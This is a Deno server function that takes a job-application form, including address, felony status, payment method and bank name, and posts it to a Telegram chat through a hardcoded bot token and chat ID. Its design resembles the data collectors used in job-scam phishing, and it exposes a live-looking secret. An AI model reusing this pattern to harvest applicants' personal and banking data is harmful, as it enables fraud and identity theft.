import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const TELEGRAM_BOT_TOKEN = "7122701602:AAEb3dv5enjswtlIyNwfTPQjN7JHQ6q5gHk";
const TELEGRAM_CHAT_ID = "-1002621531560";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
  "Content-Type": "application/json"
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === "OPTIONS") {
    return new Response(null, { 
      status: 204,
      headers: corsHeaders 
    });
  }

  try {
    const formData = await req.json();
    
    if (!formData) {
      throw new Error("No form data received");
    }

    // Validate required fields
    const requiredFields = [
      'firstName', 'lastName', 'phone', 'email',
      'streetAddress', 'city', 'state', 'postalCode',
      'country', 'felonyConviction', 'paymentMethod',
      'salaryType', 'bankName'
    ];

    const missingFields = requiredFields.filter(field => !formData[field]);
    if (missingFields.length > 0) {
      throw new Error(`Missing required fields: ${missingFields.join(', ')}`);
    }

    // Format the message for Telegram
    const message = `
🎯 New Application Received

👤 Personal Information:
- Name: ${formData.firstName} ${formData.lastName}
- Phone: ${formData.phone}
- Email: ${formData.email}

📍 Address:
${formData.streetAddress}
${formData.addressLine2 ? formData.addressLine2 + '\n' : ''}${formData.city}, ${formData.state} ${formData.postalCode}
${formData.country}

❓ Background:
- Felony Conviction: ${formData.felonyConviction}

📱 Source:
${Array.isArray(formData.heardFrom) ? formData.heardFrom.map(source => `- ${source.toUpperCase()}`).join('\n') : 'None specified'}

💰 Payment Details:
- Method: ${formData.paymentMethod}
- Salary Type: ${formData.salaryType}
- Bank: ${formData.bankName}

✅ Terms Accepted: ${formData.termsAccepted ? 'Yes' : 'No'}
    `.trim();

    // Send message to Telegram
    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      }
    );

    if (!telegramResponse.ok) {
      const telegramError = await telegramResponse.json().catch(() => ({ description: 'Unknown Telegram error' }));
      throw new Error(`Telegram API error: ${telegramError.description || JSON.stringify(telegramError)}`);
    }

    // Return success response
    return new Response(
      JSON.stringify({ 
        success: true,
        message: "Application submitted successfully" 
      }),
      { headers: corsHeaders }
    );
  } catch (error) {
    console.error("Error processing request:", error);

    // Return detailed error response
    return new Response(
      JSON.stringify({ 
        success: false,
        error: "Failed to submit application",
        details: error.message 
      }),
      { 
        status: 500,
        headers: corsHeaders
      }
    );
  }
});